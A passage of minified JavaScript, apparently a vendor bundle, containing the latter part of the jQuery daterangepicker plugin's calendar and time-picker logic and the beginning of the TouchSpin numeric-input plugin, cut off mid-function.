e.timePicker24Hour && (this.timePicker24Hour = e.timePicker24Hour), "boolean" == typeof e.autoApply && (this.autoApply = e.autoApply), "boolean" == typeof e.autoUpdateInput && (this.autoUpdateInput = e.autoUpdateInput), "boolean" == typeof e.linkedCalendars && (this.linkedCalendars = e.linkedCalendars), "function" == typeof e.isInvalidDate && (this.isInvalidDate = e.isInvalidDate), "function" == typeof e.isCustomDate && (this.isCustomDate = e.isCustomDate), "boolean" == typeof e.alwaysShowCalendars && (this.alwaysShowCalendars = e.alwaysShowCalendars), 0 != this.locale.firstDay) for (var g = this.locale.firstDay; 0 < g;)this.locale.daysOfWeek.push(this.locale.daysOfWeek.shift()), g--; if (void 0 === e.startDate && void 0 === e.endDate && E(this.element).is(":text") && (r = i = null, 2 == (s = (a = E(this.element).val()).split(this.locale.separator)).length ? (r = H(s[0], this.locale.format), i = H(s[1], this.locale.format)) : this.singleDatePicker && "" !== a && (r = H(a, this.locale.format), i = H(a, this.locale.format)), null !== r && null !== i && (this.setStartDate(r), this.setEndDate(i))), "object" == typeof e.ranges) { for (o in e.ranges) { r = "string" == typeof e.ranges[o][0] ? H(e.ranges[o][0], this.locale.format) : H(e.ranges[o][0]), i = "string" == typeof e.ranges[o][1] ? H(e.ranges[o][1], this.locale.format) : H(e.ranges[o][1]), this.minDate && r.isBefore(this.minDate) && (r = this.minDate.clone()); var l, c, I = this.maxDate; this.maxSpan && I && r.clone().add(this.maxSpan).isAfter(I) && (I = r.clone().add(this.maxSpan)), I && i.isAfter(I) && (i = I.clone()), this.minDate && i.isBefore(this.minDate, this.timepicker ? "minute" : "day") || I && r.isAfter(I, this.timepicker ? "minute" : "day") || ((l = document.createElement("textarea")).innerHTML = o, c = l.value, this.ranges[c] = [r, i]) } var u = "<ul>"; for (o in this.ranges) u += '<li data-range-key="' + o + '">' + o + "</li>"; this.showCustomRangeLabel && (u += '<li data-range-key="' + this.locale.customRangeLabel + '">' + this.locale.customRangeLabel + "</li>"), u += "</ul>", this.container.find(".ranges").prepend(u) } "function" == typeof n && (this.callback = n), this.timePicker || (this.startDate = this.startDate.startOf("day"), this.endDate = this.endDate.endOf("day"), this.container.find(".calendar-time").hide()), this.timePicker && this.autoApply && (this.autoApply = !1), this.autoApply && this.container.addClass("auto-apply"), "object" == typeof e.ranges && this.container.addClass("show-ranges"), this.singleDatePicker && (this.container.addClass("single"), this.container.find(".drp-calendar.left").addClass("single"), this.container.find(".drp-calendar.left").show(), this.container.find(".drp-calendar.right").hide(), this.timePicker || this.container.addClass("auto-apply")), (void 0 === e.ranges && !this.singleDatePicker || this.alwaysShowCalendars) && this.container.addClass("show-calendar"), this.container.addClass("opens" + this.opens), this.container.find(".applyBtn, .cancelBtn").addClass(this.buttonClasses), this.applyButtonClasses.length && this.container.find(".applyBtn").addClass(this.applyButtonClasses), this.cancelButtonClasses.length && this.container.find(".cancelBtn").addClass(this.cancelButtonClasses), this.container.find(".applyBtn").html(this.locale.applyLabel), this.container.find(".cancelBtn").html(this.locale.cancelLabel), this.container.find(".drp-calendar").on("click.daterangepicker", ".prev", E.proxy(this.clickPrev, this)).on("click.daterangepicker", ".next", E.proxy(this.clickNext, this)).on("mousedown.daterangepicker", "td.available", E.proxy(this.clickDate, this)).on("mouseenter.daterangepicker", "td.available", E.proxy(this.hoverDate, this)).on("change.daterangepicker", "select.yearselect", E.proxy(this.monthOrYearChanged, this)).on("change.daterangepicker", "select.monthselect", E.proxy(this.monthOrYearChanged, this)).on("change.daterangepicker", "select.hourselect,select.minuteselect,select.secondselect,select.ampmselect", E.proxy(this.timeChanged, this)), this.container.find(".ranges").on("click.daterangepicker", "li", E.proxy(this.clickRange, this)), this.container.find(".drp-buttons").on("click.daterangepicker", "button.applyBtn", E.proxy(this.clickApply, this)).on("click.daterangepicker", "button.cancelBtn", E.proxy(this.clickCancel, this)), this.element.is("input") || this.element.is("button") ? this.element.on({ "click.daterangepicker": E.proxy(this.show, this), "focus.daterangepicker": E.proxy(this.show, this), "keyup.daterangepicker": E.proxy(this.elementChanged, this), "keydown.daterangepicker": E.proxy(this.keydown, this) }) : (this.element.on("click.daterangepicker", E.proxy(this.toggle, this)), this.element.on("keydown.daterangepicker", E.proxy(this.toggle, this))), this.updateElement() } return i.prototype = { constructor: i, setStartDate: function (t) { "string" == typeof t && (this.startDate = H(t, this.locale.format)), "object" == typeof t && (this.startDate = H(t)), this.timePicker || (this.startDate = this.startDate.startOf("day")), this.timePicker && this.timePickerIncrement && this.startDate.minute(Math.round(this.startDate.minute() / this.timePickerIncrement) * this.timePickerIncrement), this.minDate && this.startDate.isBefore(this.minDate) && (this.startDate = this.minDate.clone(), this.timePicker && this.timePickerIncrement && this.startDate.minute(Math.round(this.startDate.minute() / this.timePickerIncrement) * this.timePickerIncrement)), this.maxDate && this.startDate.isAfter(this.maxDate) && (this.startDate = this.maxDate.clone(), this.timePicker && this.timePickerIncrement && this.startDate.minute(Math.floor(this.startDate.minute() / this.timePickerIncrement) * this.timePickerIncrement)), this.isShowing || this.updateElement(), this.updateMonthsInView() }, setEndDate: function (t) { "string" == typeof t && (this.endDate = H(t, this.locale.format)), "object" == typeof t && (this.endDate = H(t)), this.timePicker || (this.endDate = this.endDate.endOf("day")), this.timePicker && this.timePickerIncrement && this.endDate.minute(Math.round(this.endDate.minute() / this.timePickerIncrement) * this.timePickerIncrement), this.endDate.isBefore(this.startDate) && (this.endDate = this.startDate.clone()), this.maxDate && this.endDate.isAfter(this.maxDate) && (this.endDate = this.maxDate.clone()), this.maxSpan && this.startDate.clone().add(this.maxSpan).isBefore(this.endDate) && (this.endDate = this.startDate.clone().add(this.maxSpan)), this.previousRightTime = this.endDate.clone(), this.container.find(".drp-selected").html(this.startDate.format(this.locale.format) + this.locale.separator + this.endDate.format(this.locale.format)), this.isShowing || this.updateElement(), this.updateMonthsInView() }, isInvalidDate: function () { return !1 }, isCustomDate: function () { return !1 }, updateView: function () { this.timePicker && (this.renderTimePicker("left"), this.renderTimePicker("right"), this.endDate ? this.container.find(".right .calendar-time select").removeAttr("disabled").removeClass("disabled") : this.container.find(".right .calendar-time select").attr("disabled", "disabled").addClass("disabled")), this.endDate && this.container.find(".drp-selected").html(this.startDate.format(this.locale.format) + this.locale.separator + this.endDate.format(this.locale.format)), this.updateMonthsInView(), this.updateCalendars(), this.updateFormInputs() }, updateMonthsInView: function () { if (this.endDate) { if (!this.singleDatePicker && this.leftCalendar.month && this.rightCalendar.month && (this.startDate.format("YYYY-MM") == this.leftCalendar.month.format("YYYY-MM") || this.startDate.format("YYYY-MM") == this.rightCalendar.month.format("YYYY-MM")) && (this.endDate.format("YYYY-MM") == this.leftCalendar.month.format("YYYY-MM") || this.endDate.format("YYYY-MM") == this.rightCalendar.month.format("YYYY-MM"))) return; this.leftCalendar.month = this.startDate.clone().date(2), this.linkedCalendars || this.endDate.month() == this.startDate.month() && this.endDate.year() == this.startDate.year() ? this.rightCalendar.month = this.startDate.clone().date(2).add(1, "month") : this.rightCalendar.month = this.endDate.clone().date(2) } else this.leftCalendar.month.format("YYYY-MM") != this.startDate.format("YYYY-MM") && this.rightCalendar.month.format("YYYY-MM") != this.startDate.format("YYYY-MM") && (this.leftCalendar.month = this.startDate.clone().date(2), this.rightCalendar.month = this.startDate.clone().date(2).add(1, "month")); this.maxDate && this.linkedCalendars && !this.singleDatePicker && this.rightCalendar.month > this.maxDate && (this.rightCalendar.month = this.maxDate.clone().date(2), this.leftCalendar.month = this.maxDate.clone().date(2).subtract(1, "month")) }, updateCalendars: function () { var t, e, n, i; this.timePicker && (this.endDate ? (e = parseInt(this.container.find(".left .hourselect").val(), 10), n = parseInt(this.container.find(".left .minuteselect").val(), 10), isNaN(n) && (n = parseInt(this.container.find(".left .minuteselect option:last").val(), 10)), t = this.timePickerSeconds ? parseInt(this.container.find(".left .secondselect").val(), 10) : 0, this.timePicker24Hour || ("PM" === (i = this.container.find(".left .ampmselect").val()) && e < 12 && (e += 12), "AM" === i && 12 === e && (e = 0))) : (e = parseInt(this.container.find(".right .hourselect").val(), 10), n = parseInt(this.container.find(".right .minuteselect").val(), 10), isNaN(n) && (n = parseInt(this.container.find(".right .minuteselect option:last").val(), 10)), t = this.timePickerSeconds ? parseInt(this.container.find(".right .secondselect").val(), 10) : 0, this.timePicker24Hour || ("PM" === (i = this.container.find(".right .ampmselect").val()) && e < 12 && (e += 12), "AM" === i && 12 === e && (e = 0))), this.leftCalendar.month.hour(e).minute(n).second(t), this.rightCalendar.month.hour(e).minute(n).second(t)), this.renderCalendar("left"), this.renderCalendar("right"), this.container.find(".ranges li").removeClass("active"), null != this.endDate && this.calculateChosenLabel() }, renderCalendar: function (t) { var e = "left" == t ? this.leftCalendar : this.rightCalendar, n = e.month.month(), i = e.month.year(), o = e.month.hour(), a = e.month.minute(), s = e.month.second(), r = H([i, n]).daysInMonth(), g = H([i, n, 1]), l = H([i, n, r]), c = H(g).subtract(1, "month").month(), I = H(g).subtract(1, "month").year(), u = H([I, c]).daysInMonth(), h = g.day(); (e = []).firstDay = g, e.lastDay = l; for (var d = 0; d < 6; d++)e[d] = []; var C = u - h + this.locale.firstDay + 1; u < C && (C -= 7), h == this.locale.firstDay && (C = u - 6); for (var A = H([I, c, C, 12, a, s]), d = 0, p = 0, m = 0; d < 42; d++, p++, A = H(A).add(24, "hour"))0 < d && p % 7 == 0 && (p = 0, m++), e[m][p] = A.clone().hour(o).minute(a).second(s), A.hour(12), this.minDate && e[m][p].format("YYYY-MM-DD") == this.minDate.format("YYYY-MM-DD") && e[m][p].isBefore(this.minDate) && "left" == t && (e[m][p] = this.minDate.clone()), this.maxDate && e[m][p].format("YYYY-MM-DD") == this.maxDate.format("YYYY-MM-DD") && e[m][p].isAfter(this.maxDate) && "right" == t && (e[m][p] = this.maxDate.clone()); "left" == t ? this.leftCalendar.calendar = e : this.rightCalendar.calendar = e; var f = "left" == t ? this.minDate : this.startDate, b = this.maxDate, B = ("left" == t ? this.startDate : this.endDate, this.locale.direction, '<table class="table-condensed">'); B += "<thead>", B += "<tr>", (this.showWeekNumbers || this.showISOWeekNumbers) && (B += "<th></th>"), f && !f.isBefore(e.firstDay) || this.linkedCalendars && "left" != t ? B += "<th></th>" : B += '<th class="prev available"><span></span></th>'; var y, v = this.locale.monthNames[e[1][1].month()] + e[1][1].format(" YYYY"); if (this.showDropdowns) { for (var x = e[1][1].month(), F = e[1][1].year(), Q = b && b.year() || this.maxYear, G = f && f.year() || this.minYear, w = F == G, X = F == Q, S = '<select class="monthselect">', k = 0; k < 12; k++)(!w || f && k >= f.month()) && (!X || b && k <= b.month()) ? S += "<option value='" + k + "'" + (k === x ? " selected='selected'" : "") + ">" + this.locale.monthNames[k] + "</option>" : S += "<option value='" + k + "'" + (k === x ? " selected='selected'" : "") + " disabled='disabled'>" + this.locale.monthNames[k] + "</option>"; S += "</select>"; for (var D = '<select class="yearselect">', Z = G; Z <= Q; Z++)D += '<option value="' + Z + '"' + (Z === F ? ' selected="selected"' : "") + ">" + Z + "</option>"; v = S + (D += "</select>") } B += '<th colspan="5" class="month">' + v + "</th>", b && !b.isAfter(e.lastDay) || this.linkedCalendars && "right" != t && !this.singleDatePicker ? B += "<th></th>" : B += '<th class="next available"><span></span></th>', B += "</tr>", B += "<tr>", (this.showWeekNumbers || this.showISOWeekNumbers) && (B += '<th class="week">' + this.locale.weekLabel + "</th>"), E.each(this.locale.daysOfWeek, function (t, e) { B += "<th>" + e + "</th>" }), B += "</tr>", B += "</thead>", B += "<tbody>", null == this.endDate && this.maxSpan && (y = this.startDate.clone().add(this.maxSpan).endOf("day"), b && !y.isBefore(b) || (b = y)); for (m = 0; m < 6; m++) { B += "<tr>", this.showWeekNumbers ? B += '<td class="week">' + e[m][0].week() + "</td>" : this.showISOWeekNumbers && (B += '<td class="week">' + e[m][0].isoWeek() + "</td>"); for (p = 0; p < 7; p++) { var U = []; e[m][p].isSame(new Date, "day") && U.push("today"), 5 < e[m][p].isoWeekday() && U.push("weekend"), e[m][p].month() != e[1][1].month() && U.push("off", "ends"), this.minDate && e[m][p].isBefore(this.minDate, "day") && U.push("off", "disabled"), b && e[m][p].isAfter(b, "day") && U.push("off", "disabled"), this.isInvalidDate(e[m][p]) && U.push("off", "disabled"), e[m][p].format("YYYY-MM-DD") == this.startDate.format("YYYY-MM-DD") && U.push("active", "start-date"), null != this.endDate && e[m][p].format("YYYY-MM-DD") == this.endDate.format("YYYY-MM-DD") && U.push("active", "end-date"), null != this.endDate && e[m][p] > this.startDate && e[m][p] < this.endDate && U.push("in-range"); var W = this.isCustomDate(e[m][p]); !1 !== W && ("string" == typeof W ? U.push(W) : Array.prototype.push.apply(U, W)); for (var N = "", T = !1, d = 0; d < U.length; d++)N += U[d] + " ", "disabled" == U[d] && (T = !0); T || (N += "available"), B += '<td class="' + N.replace(/^\s+|\s+$/g, "") + '" data-title="r' + m + "c" + p + '">' + e[m][p].date() + "</td>" } B += "</tr>" } B += "</tbody>", B += "</table>", this.container.find(".drp-calendar." + t + " .calendar-table").html(B) }, renderTimePicker: function (t) { if ("right" != t || this.endDate) { var e, n, i, o, a, s = this.maxDate; !this.maxSpan || this.maxDate && !this.startDate.clone().add(this.maxSpan).isBefore(this.maxDate) || (s = this.startDate.clone().add(this.maxSpan)), "left" == t ? (n = this.startDate.clone(), i = this.minDate) : "right" == t && (n = this.endDate.clone(), i = this.startDate, "" != (o = this.container.find(".drp-calendar.right .calendar-time")).html() && (n.hour(isNaN(n.hour()) ? o.find(".hourselect option:selected").val() : n.hour()), n.minute(isNaN(n.minute()) ? o.find(".minuteselect option:selected").val() : n.minute()), n.second(isNaN(n.second()) ? o.find(".secondselect option:selected").val() : n.second()), this.timePicker24Hour || ("PM" === (a = o.find(".ampmselect option:selected").val()) && n.hour() < 12 && n.hour(n.hour() + 12), "AM" === a && 12 === n.hour() && n.hour(0))), n.isBefore(this.startDate) && (n = this.startDate.clone()), s && n.isAfter(s) && (n = s.clone())), e = '<select class="hourselect">'; for (var r = this.timePicker24Hour ? 0 : 1, g = this.timePicker24Hour ? 23 : 12, l = r; l <= g; l++) { var c = l; this.timePicker24Hour || (c = 12 <= n.hour() ? 12 == l ? 12 : l + 12 : 12 == l ? 0 : l); var I = n.clone().hour(c), u = !1; i && I.minute(59).isBefore(i) && (u = !0), s && I.minute(0).isAfter(s) && (u = !0), c != n.hour() || u ? e += u ? '<option value="' + l + '" disabled="disabled" class="disabled">' + l + "</option>" : '<option value="' + l + '">' + l + "</option>" : e += '<option value="' + l + '" selected="selected">' + l + "</option>" } e += "</select> ", e += ': <select class="minuteselect">'; for (var h, d, l = 0; l < 60; l += this.timePickerIncrement) { var C = l < 10 ? "0" + l : l, I = n.clone().minute(l), u = !1; i && I.second(59).isBefore(i) && (u = !0), s && I.second(0).isAfter(s) && (u = !0), n.minute() != l || u ? e += u ? '<option value="' + l + '" disabled="disabled" class="disabled">' + C + "</option>" : '<option value="' + l + '">' + C + "</option>" : e += '<option value="' + l + '" selected="selected">' + C + "</option>" } if (e += "</select> ", this.timePickerSeconds) { e += ': <select class="secondselect">'; for (l = 0; l < 60; l++) { C = l < 10 ? "0" + l : l, I = n.clone().second(l), u = !1; i && I.isBefore(i) && (u = !0), s && I.isAfter(s) && (u = !0), n.second() != l || u ? e += u ? '<option value="' + l + '" disabled="disabled" class="disabled">' + C + "</option>" : '<option value="' + l + '">' + C + "</option>" : e += '<option value="' + l + '" selected="selected">' + C + "</option>" } e += "</select> " } this.timePicker24Hour || (e += '<select class="ampmselect">', d = h = "", i && n.clone().hour(12).minute(0).second(0).isBefore(i) && (h = ' disabled="disabled" class="disabled"'), s && n.clone().hour(0).minute(0).second(0).isAfter(s) && (d = ' disabled="disabled" class="disabled"'), 12 <= n.hour() ? e += '<option value="AM"' + h + '>AM</option><option value="PM" selected="selected"' + d + ">PM</option>" : e += '<option value="AM" selected="selected"' + h + '>AM</option><option value="PM"' + d + ">PM</option>", e += "</select>"), this.container.find(".drp-calendar." + t + " .calendar-time").html(e) } }, updateFormInputs: function () { this.singleDatePicker || this.endDate && (this.startDate.isBefore(this.endDate) || this.startDate.isSame(this.endDate)) ? this.container.find("button.applyBtn").removeAttr("disabled") : this.container.find("button.applyBtn").attr("disabled", "disabled") }, move: function () { var t, e = { top: 0, left: 0 }, n = E(window).width(); this.parentEl.is("body") || (e = { top: this.parentEl.offset().top - this.parentEl.scrollTop(), left: this.parentEl.offset().left - this.parentEl.scrollLeft() }, n = this.parentEl[0].clientWidth + this.parentEl.offset().left), t = "up" == this.drops ? this.element.offset().top - this.container.outerHeight() - e.top : this.element.offset().top + this.element.outerHeight() - e.top, this.container.css({ top: 0, left: 0, right: "auto" }); var i, o, a = this.container.outerWidth(); this.container["up" == this.drops ? "addClass" : "removeClass"]("drop-up"), "left" == this.opens ? a + (i = n - this.element.offset().left - this.element.outerWidth()) > E(window).width() ? this.container.css({ top: t, right: "auto", left: 9 }) : this.container.css({ top: t, right: i, left: "auto" }) : "center" == this.opens ? (o = this.element.offset().left - e.left + this.element.outerWidth() / 2 - a / 2) < 0 ? this.container.css({ top: t, right: "auto", left: 9 }) : o + a > E(window).width() ? this.container.css({ top: t, left: "auto", right: 0 }) : this.container.css({ top: t, left: o, right: "auto" }) : (o = this.element.offset().left - e.left) + a > E(window).width() ? this.container.css({ top: t, left: "auto", right: 0 }) : this.container.css({ top: t, left: o, right: "auto" }) }, show: function (t) { this.isShowing || (this._outsideClickProxy = E.proxy(function (t) { this.outsideClick(t) }, this), E(document).on("mousedown.daterangepicker", this._outsideClickProxy).on("touchend.daterangepicker", this._outsideClickProxy).on("click.daterangepicker", "[data-toggle=dropdown]", this._outsideClickProxy).on("focusin.daterangepicker", this._outsideClickProxy), E(window).on("resize.daterangepicker", E.proxy(function (t) { this.move(t) }, this)), this.oldStartDate = this.startDate.clone(), this.oldEndDate = this.endDate.clone(), this.previousRightTime = this.endDate.clone(), this.updateView(), this.container.show(), this.move(), this.element.trigger("show.daterangepicker", this), this.isShowing = !0) }, hide: function (t) { this.isShowing && (this.endDate || (this.startDate = this.oldStartDate.clone(), this.endDate = this.oldEndDate.clone()), this.startDate.isSame(this.oldStartDate) && this.endDate.isSame(this.oldEndDate) || this.callback(this.startDate.clone(), this.endDate.clone(), this.chosenLabel), this.updateElement(), E(document).off(".daterangepicker"), E(window).off(".daterangepicker"), this.container.hide(), this.element.trigger("hide.daterangepicker", this), this.isShowing = !1) }, toggle: function (t) { this.isShowing ? this.hide() : this.show() }, outsideClick: function (t) { var e = E(t.target); "focusin" == t.type || e.closest(this.element).length || e.closest(this.container).length || e.closest(".calendar-table").length || (this.hide(), this.element.trigger("outsideClick.daterangepicker", this)) }, showCalendars: function () { this.container.addClass("show-calendar"), this.move(), this.element.trigger("showCalendar.daterangepicker", this) }, hideCalendars: function () { this.container.removeClass("show-calendar"), this.element.trigger("hideCalendar.daterangepicker", this) }, clickRange: function (t) { var e, n = t.target.getAttribute("data-range-key"); (this.chosenLabel = n) == this.locale.customRangeLabel ? this.showCalendars() : (e = this.ranges[n], this.startDate = e[0], this.endDate = e[1], this.timePicker || (this.startDate.startOf("day"), this.endDate.endOf("day")), this.alwaysShowCalendars || this.hideCalendars(), this.clickApply()) }, clickPrev: function (t) { E(t.target).parents(".drp-calendar").hasClass("left") ? (this.leftCalendar.month.subtract(1, "month"), this.linkedCalendars && this.rightCalendar.month.subtract(1, "month")) : this.rightCalendar.month.subtract(1, "month"), this.updateCalendars() }, clickNext: function (t) { E(t.target).parents(".drp-calendar").hasClass("left") ? this.leftCalendar.month.add(1, "month") : (this.rightCalendar.month.add(1, "month"), this.linkedCalendars && this.leftCalendar.month.add(1, "month")), this.updateCalendars() }, hoverDate: function (t) { var e, n, i, s, r, g, l; E(t.target).hasClass("available") && (n = (e = E(t.target).attr("data-title")).substr(1, 1), i = e.substr(3, 1), s = E(t.target).parents(".drp-calendar").hasClass("left") ? this.leftCalendar.calendar[n][i] : this.rightCalendar.calendar[n][i], r = this.leftCalendar, g = this.rightCalendar, l = this.startDate, this.endDate || this.container.find(".drp-calendar tbody td").each(function (t, e) { var n, i, o, a; E(e).hasClass("week") || (i = (n = E(e).attr("data-title")).substr(1, 1), o = n.substr(3, 1), (a = E(e).parents(".drp-calendar").hasClass("left") ? r.calendar[i][o] : g.calendar[i][o]).isAfter(l) && a.isBefore(s) || a.isSame(s, "day") ? E(e).addClass("in-range") : E(e).removeClass("in-range")) })) }, clickDate: function (t) { var e, n, i, o, a, s, r, g; E(t.target).hasClass("available") && (n = (e = E(t.target).attr("data-title")).substr(1, 1), i = e.substr(3, 1), o = E(t.target).parents(".drp-calendar").hasClass("left") ? this.leftCalendar.calendar[n][i] : this.rightCalendar.calendar[n][i], this.endDate || o.isBefore(this.startDate, "day") ? (this.timePicker && (a = parseInt(this.container.find(".left .hourselect").val(), 10), this.timePicker24Hour || ("PM" === (s = this.container.find(".left .ampmselect").val()) && a < 12 && (a += 12), "AM" === s && 12 === a && (a = 0)), r = parseInt(this.container.find(".left .minuteselect").val(), 10), isNaN(r) && (r = parseInt(this.container.find(".left .minuteselect option:last").val(), 10)), g = this.timePickerSeconds ? parseInt(this.container.find(".left .secondselect").val(), 10) : 0, o = o.clone().hour(a).minute(r).second(g)), this.endDate = null, this.setStartDate(o.clone())) : !this.endDate && o.isBefore(this.startDate) ? this.setEndDate(this.startDate.clone()) : (this.timePicker && (a = parseInt(this.container.find(".right .hourselect").val(), 10), this.timePicker24Hour || ("PM" === (s = this.container.find(".right .ampmselect").val()) && a < 12 && (a += 12), "AM" === s && 12 === a && (a = 0)), r = parseInt(this.container.find(".right .minuteselect").val(), 10), isNaN(r) && (r = parseInt(this.container.find(".right .minuteselect option:last").val(), 10)), g = this.timePickerSeconds ? parseInt(this.container.find(".right .secondselect").val(), 10) : 0, o = o.clone().hour(a).minute(r).second(g)), this.setEndDate(o.clone()), this.autoApply && (this.calculateChosenLabel(), this.clickApply())), this.singleDatePicker && (this.setEndDate(this.startDate), this.timePicker || this.clickApply()), this.updateView(), t.stopPropagation()) }, calculateChosenLabel: function () { var t = !0, e = 0; for (var n in this.ranges) { if (this.timePicker) { var i = this.timePickerSeconds ? "YYYY-MM-DD HH:mm:ss" : "YYYY-MM-DD HH:mm"; if (this.startDate.format(i) == this.ranges[n][0].format(i) && this.endDate.format(i) == this.ranges[n][1].format(i)) { t = !1, this.chosenLabel = this.container.find(".ranges li:eq(" + e + ")").addClass("active").attr("data-range-key"); break } } else if (this.startDate.format("YYYY-MM-DD") == this.ranges[n][0].format("YYYY-MM-DD") && this.endDate.format("YYYY-MM-DD") == this.ranges[n][1].format("YYYY-MM-DD")) { t = !1, this.chosenLabel = this.container.find(".ranges li:eq(" + e + ")").addClass("active").attr("data-range-key"); break } e++ } t && (this.showCustomRangeLabel ? this.chosenLabel = this.container.find(".ranges li:last").addClass("active").attr("data-range-key") : this.chosenLabel = null, this.showCalendars()) }, clickApply: function (t) { this.hide(), this.element.trigger("apply.daterangepicker", this) }, clickCancel: function (t) { this.startDate = this.oldStartDate, this.endDate = this.oldEndDate, this.hide(), this.element.trigger("cancel.daterangepicker", this) }, monthOrYearChanged: function (t) { var e = E(t.target).closest(".drp-calendar").hasClass("left"), n = e ? "left" : "right", i = this.container.find(".drp-calendar." + n), o = parseInt(i.find(".monthselect").val(), 10), a = i.find(".yearselect").val(); e || (a < this.startDate.year() || a == this.startDate.year() && o < this.startDate.month()) && (o = this.startDate.month(), a = this.startDate.year()), this.minDate && (a < this.minDate.year() || a == this.minDate.year() && o < this.minDate.month()) && (o = this.minDate.month(), a = this.minDate.year()), this.maxDate && (a > this.maxDate.year() || a == this.maxDate.year() && o > this.maxDate.month()) && (o = this.maxDate.month(), a = this.maxDate.year()), e ? (this.leftCalendar.month.month(o).year(a), this.linkedCalendars && (this.rightCalendar.month = this.leftCalendar.month.clone().add(1, "month"))) : (this.rightCalendar.month.month(o).year(a), this.linkedCalendars && (this.leftCalendar.month = this.rightCalendar.month.clone().subtract(1, "month"))), this.updateCalendars() }, timeChanged: function (t) { var e = E(t.target).closest(".drp-calendar"), n = e.hasClass("left"), i = parseInt(e.find(".hourselect").val(), 10), o = parseInt(e.find(".minuteselect").val(), 10); isNaN(o) && (o = parseInt(e.find(".minuteselect option:last").val(), 10)); var a, s, r, g = this.timePickerSeconds ? parseInt(e.find(".secondselect").val(), 10) : 0; this.timePicker24Hour || ("PM" === (a = e.find(".ampmselect").val()) && i < 12 && (i += 12), "AM" === a && 12 === i && (i = 0)), n ? ((s = this.startDate.clone()).hour(i), s.minute(o), s.second(g), this.setStartDate(s), this.singleDatePicker ? this.endDate = this.startDate.clone() : this.endDate && this.endDate.format("YYYY-MM-DD") == s.format("YYYY-MM-DD") && this.endDate.isBefore(s) && this.setEndDate(s.clone())) : this.endDate && ((r = this.endDate.clone()).hour(i), r.minute(o), r.second(g), this.setEndDate(r)), this.updateCalendars(), this.updateFormInputs(), this.renderTimePicker("left"), this.renderTimePicker("right") }, elementChanged: function () { var t, e, n; this.element.is("input") && this.element.val().length && (n = e = null, 2 === (t = this.element.val().split(this.locale.separator)).length && (e = H(t[0], this.locale.format), n = H(t[1], this.locale.format)), !this.singleDatePicker && null !== e && null !== n || (n = e = H(this.element.val(), this.locale.format)), e.isValid() && n.isValid() && (this.setStartDate(e), this.setEndDate(n), this.updateView())) }, keydown: function (t) { 9 !== t.keyCode && 13 !== t.keyCode || this.hide(), 27 === t.keyCode && (t.preventDefault(), t.stopPropagation(), this.hide()) }, updateElement: function () { var t; this.element.is("input") && this.autoUpdateInput && (t = this.startDate.format(this.locale.format), this.singleDatePicker || (t += this.locale.separator + this.endDate.format(this.locale.format)), t !== this.element.val() && this.element.val(t).trigger("change")) }, remove: function () { this.container.remove(), this.element.off(".daterangepicker"), this.element.removeData() } }, E.fn.daterangepicker = function (t, e) { var n = E.extend(!0, {}, E.fn.daterangepicker.defaultOptions, t); return this.each(function () { var t = E(this); t.data("daterangepicker") && t.data("daterangepicker").remove(), t.data("daterangepicker", new i(t, n, e)) }), this }, i }), function (n) { "function" == typeof define && define.amd ? define(["jquery"], n) : "object" == typeof module && module.exports ? module.exports = function (t, e) { return void 0 === e && (e = "undefined" != typeof window ? require("jquery") : require("jquery")(t)), n(e), e } : n(jQuery) }(function (F) { "use strict"; var Q = 0; F.fn.TouchSpin = function (y) { var v = { min: 0, max: 100, initval: "", replacementval: "", step: 1, decimals: 0, stepinterval: 100, forcestepdivisibility: "round", stepintervaldelay: 500, verticalbuttons: !1, verticalup: "+", verticaldown: "-", verticalupclass: "", verticaldownclass: "", prefix: "", postfix: "", prefix_extraclass: "", postfix_extraclass: "", booster: !0, boostat: 10, maxboostedstep: !1, mousewheel: !0, buttondown_class: "btn btn-primary", buttonup_class: "btn btn-primary", buttondown_txt: "-", buttonup_txt: "+", callback_before_calculation: function (t) { return t }, callback_after_calculation: function (t) { return t } }, x = { min: "min", max: "max", initval: "init-val", replacementval: "replacement-val", step: "step", decimals: "decimals", stepinterval: "step-interval", verticalbuttons: "vertical-buttons", verticalupclass: "vertical-up-class", verticaldownclass: "vertical-down-class", forcestepdivisibility: "force-step-divisibility", stepintervaldelay: "step-interval-delay", prefix: "prefix", postfix: "postfix", prefix_extraclass: "prefix-extra-class", postfix_extraclass: "postfix-extra-class", booster: "booster", boostat: "boostat", maxboostedstep: "max-boosted-step", mousewheel: "mouse-wheel", buttondown_class: "button-down-class", buttonup_class: "button-up-class", buttondown_txt: "button-down-txt", buttonup_txt: "button-up-txt" }; return this.each(function () { var r, n, i, g, o, a, t, e, s, l, c = F(this), I = c.data(), u = 0, h = !1; function d() { "" === r.prefix && (n = o.prefix.detach()), "" === r.postfix && (i = o.postfix.detach()) } function C() { var t, e, n = r.callback_before_calculation(c.val()); "" !== n ? 0 < r.decimals && "." === n || (t = parseFloat(n), isNaN(t) && (t = "" !== r.replacementval ? r.replacementval : 0), (e = t).toString() !== n && (e = t), null !== r.min && t < r.min && (e = r.min), null !== r.max && t > r.max && (e = r.max), e = function (t) { switch (r.forcestepdivisibility) { case "round": return (Math.round(t / r.step) * r.step).toFixed(r.decimals); case "floor": return (Math.floor(t / r.step) * r.step).toFixed(r.decimals); case "ceil": return (Math.ceil(t / r.step) * r.step).toFixed(r.decimals); default: return t } }(e), Number(n).toString() !== e.toString() && (c.val(e), c.trigger("change"))) : "" !== r.replacementval && (c.val(r.replacementval), c.trigger("change")) } function A() { if (r.booster) { var t = Math.pow(2, Math.floor(u / r.boostat)) * r.step; return r.maxboostedstep && t > r.maxboostedstep && (t = r.maxboostedstep, a = Math.round(a / t) * t), Math.max(r.step, t) } return r.step } function p() { C(), a = parseFloat(r.callback_before_calculation(o.input.val())), isNaN(a) && (a = 0); var t = a, e = A(); a += e, null !== r.max && a > r.max && (a = r.max, c.trigger("touchspin.on.max"), B()), o.input.val(r.callback_after_calculation(Number(a).toFixed(r.decimals))), t !== a && c.trigger("change") } function m() { C(), a = parseFloat(r.callback_before_calculation(o.input.val())), isNaN(a) && (a = 0); var t = a, e = A(); a -= e, null !== r.min && a < r.min && (a = r.min, c.trigger("touchspin.on.min"), B()), o.input.val(r.callback_after_calculation(Number(a).toFixed(r.decimals))), t !== a && c.trigger("change") } function f() { B(), u = 0, h = "down", c.trigger("touchspin.on.startspin"), c.trigger("touchspin.on.startdownspin"), s = setTimeout(function () { t = setInterval(function () { u++, m() }, r.stepinterval) }, r.stepintervaldelay) } function b() { B(), u = 0, h = "up", c.trigger("touchspin.on.startspin"), c.trigger("touchspin.on.startupspin"), l = setTimeout(function () { e = setInterval(function () { u++, p() }, r.stepinterval) }, r.stepintervaldelay) } function B() { switch (clearTimeout(s), clearTimeout(l), 